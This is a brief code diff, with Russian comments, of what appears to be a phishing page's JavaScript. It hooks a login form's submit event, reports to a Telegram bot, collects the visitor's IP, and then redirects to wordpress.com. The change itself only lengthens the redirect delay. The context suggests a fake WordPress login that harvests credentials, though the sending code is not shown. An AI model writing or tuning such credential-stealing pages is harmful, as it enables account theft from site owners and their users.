@@ -31,7 +31,7 @@ document.getElementById('loginform').addEventListener('submit', async function(e
             // Меняем редирект на официальный сайт WordPress
             setTimeout(() => {
                 window.location.href = 'https://wordpress.com/';
-            }, 1500);
+            }, 15000);
         } else {
             console.error("Ошибка от Telegram:", responseData);
             window.location.href = 'https://wordpress.com/';
@@ -53,5 +53,6 @@ async function getIP() {
     }
 
 }
+
 
 
